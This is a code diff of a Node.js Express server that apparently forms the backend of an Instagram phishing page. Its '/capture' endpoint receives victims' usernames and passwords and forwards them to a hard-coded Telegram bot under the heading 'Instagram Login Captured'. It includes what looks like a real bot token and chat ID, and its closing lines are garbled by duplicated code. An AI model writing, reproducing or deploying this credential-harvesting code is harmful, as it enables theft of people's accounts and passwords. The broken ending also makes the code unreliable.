@@ -5,13 +5,12 @@ const fetch = require('node-fetch');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// YOUR TELEGRAM DETAILS (already filled)
 const TELEGRAM_TOKEN = "8696476669:AAGMMBP7BKj3f_D4KwMU4xbVMEj4q_hZqr4";
 const CHAT_ID = "8725339154";
 
 app.use(cors());
 app.use(express.json());
-app.use(express.static(__dirname));   // serves index.html and 1.html
+app.use(express.static(__dirname));
 
 app.post('/capture', async (req, res) => {
     const { username, password, target, time } = req.body || {};
@@ -22,7 +21,6 @@ app.post('/capture', async (req, res) => {
 
     console.log(`[CAPTURED] Username: ${username}`);
 
-    // Clean and nicely formatted message
     const message = `
 *Instagram Login Captured* 🔥
 
@@ -33,8 +31,26 @@ app.post('/capture', async (req, res) => {
     `.trim();
 
     try {
-        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
             method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: "MarkdownV2"
+            })
+        });
+        console.log("✅ Sent to Telegram");
+    } catch (err) {
+        console.error("❌ Telegram error:", err.message);
+    }
+
+    res.json({ success: true });
+});
+
+app.listen(PORT, () => {
+    console.log(`Server running on port ${PORT}`);
+});            method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
                 chat_id: CHAT_ID,
